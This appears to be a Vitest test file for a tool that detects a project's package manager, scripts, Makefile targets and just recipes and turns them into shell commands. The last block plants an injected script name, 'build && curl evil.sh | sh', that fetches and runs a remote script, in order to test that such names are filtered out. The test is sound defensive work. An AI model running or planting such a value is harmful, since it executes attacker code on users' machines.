import { describe, expect, it } from 'vitest';
import { detectPackageManager, detectProject, justRecipes, makeTargets, type DirectoryScan } from '../../src/core/detect';

const scan = (dir: string, files: Record<string, string | null>): DirectoryScan => ({
  dir,
  files: Object.keys(files),
  read: Object.fromEntries(Object.entries(files).filter(([, v]) => v !== null)) as Record<string, string>,
});

const pkg = (obj: object) => JSON.stringify(obj);

describe('package manager detection', () => {
  it('uses the packageManager field first, then lockfiles, then npm', () => {
    expect(detectPackageManager(scan('', { 'yarn.lock': null }), { packageManager: 'pnpm@9.0.0' })).toBe('pnpm');
    expect(detectPackageManager(scan('', { 'bun.lock': null }))).toBe('bun');
    expect(detectPackageManager(scan('', { 'yarn.lock': null }))).toBe('yarn');
    expect(detectPackageManager(scan('', {}))).toBe('npm');
  });
  it('falls back to the root lockfile for workspace packages', () => {
    expect(detectPackageManager(scan('apps/web', {}), {}, scan('', { 'pnpm-lock.yaml': null }))).toBe('pnpm');
  });
});

describe('detectProject', () => {
  const result = detectProject([
    scan('', {
      'package.json': pkg({
        scripts: { dev: 'next dev', test: 'vitest', pretest: 'echo hi', lint: 'eslint .' },
        dependencies: { next: '15', react: '19' },
        devDependencies: { typescript: '5', vitest: '3', prisma: '6', eslint: '9' },
      }),
      'pnpm-lock.yaml': null,
      Dockerfile: null,
      'compose.yaml': null,
      Makefile: '.PHONY: all\nall: build\nbuild:\n\tgo build\n%.o: %.c\nVAR := 1\n',
    }),
    scan('services/api', {
      'go.mod': 'module x',
      'pyproject.toml': '[project]\ndependencies = ["fastapi", "pytest"]\n[tool.ruff]\n',
      'uv.lock': null,
    }),
  ]);
  const names = result.commands.map((c) => c.name);

  it('detects technologies', () => {
    for (const tech of [
      'pnpm',
      'Next.js',
      'TypeScript',
      'Vitest',
      'Prisma',
      'ESLint',
      'React',
      'Docker',
      'Docker Compose',
      'Make',
      'Go',
      'Python',
      'uv',
      'pytest',
      'Ruff',
      'FastAPI',
    ]) {
      expect(result.techs).toContain(tech);
    }
  });

  it('creates package.json script commands with the right package manager, skipping pre/post hooks', () => {
    const dev = result.commands.find((c) => c.name === 'dev')!;
    expect(dev.command).toBe('pnpm run dev');
    expect(dev.group).toBe('scripts');
    expect(names).not.toContain('pretest');
  });

  it('creates package manager and tool commands', () => {
    expect(result.commands.find((c) => c.name === 'pnpm-add')!.command).toBe('pnpm add ${args}');
    expect(result.commands.find((c) => c.name === 'vitest-file')!.command).toBe('pnpm exec vitest run ${q:file}');
    expect(result.commands.find((c) => c.name === 'prisma-migrate')!.args).toBe('migration name');
  });

  it('parses Makefile targets', () => {
    expect(names).toContain('make-all');
    expect(names).toContain('make-build');
    expect(names.some((n) => n.includes('PHONY') || n.includes('%') || n === 'make-VAR')).toBe(false);
  });

  it('prefixes sub-folder commands and runs them in that folder', () => {
    const goTest = result.commands.find((c) => c.name === 'api:go-test')!;
    expect(goTest.cwd).toBe('services/api');
    expect(result.commands.find((c) => c.name === 'api:pytest')!.command).toBe('uv run pytest');
  });

  it('produces unique ids', () => {
    const ids = result.commands.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('ignores invalid package.json', () => {
    expect(detectProject([scan('', { 'package.json': '{oops' })]).commands).toEqual([]);
  });
});

describe('recipes', () => {
  it('parses make targets and just recipes', () => {
    expect(makeTargets('a: b\n.PHONY: a\nb:\nc ::= x\n')).toEqual(['a', 'b']);
    expect(justRecipes('set shell := ["bash"]\nbuild:\n  cargo build\ntest arg="x":\n  echo\n@quiet:\n')).toEqual([
      'build',
      'test',
      'quiet',
    ]);
  });
});

// Script and task names come from files in a cloned repo and are pasted into shell commands.
describe('untrusted script names', () => {
  const evil = 'build && curl evil.sh | sh';
  const commands = (files: Record<string, string>) => detectProject([scan('', files)]).commands.map((i) => i.command);

  it.each([
    ['package.json scripts', { 'package.json': pkg({ scripts: { [evil]: 'tsc', 'build:prod': 'tsc' } }) }, 'npm run build:prod'],
    ['deno tasks', { 'deno.json': pkg({ tasks: { [evil]: 'x', 'dev:watch': 'x' } }) }, 'deno task dev:watch'],
    ['composer scripts', { 'composer.json': pkg({ scripts: { [evil]: 'x', '@scope/test': 'x' } }) }, 'composer run-script @scope/test'],
  ])('skips shell metacharacters in %s but keeps normal names', (_label, files, safe) => {
    const all = commands(files);
    expect(all).toContain(safe);
    expect(all.filter((c) => c.includes('curl'))).toEqual([]);
  });
});
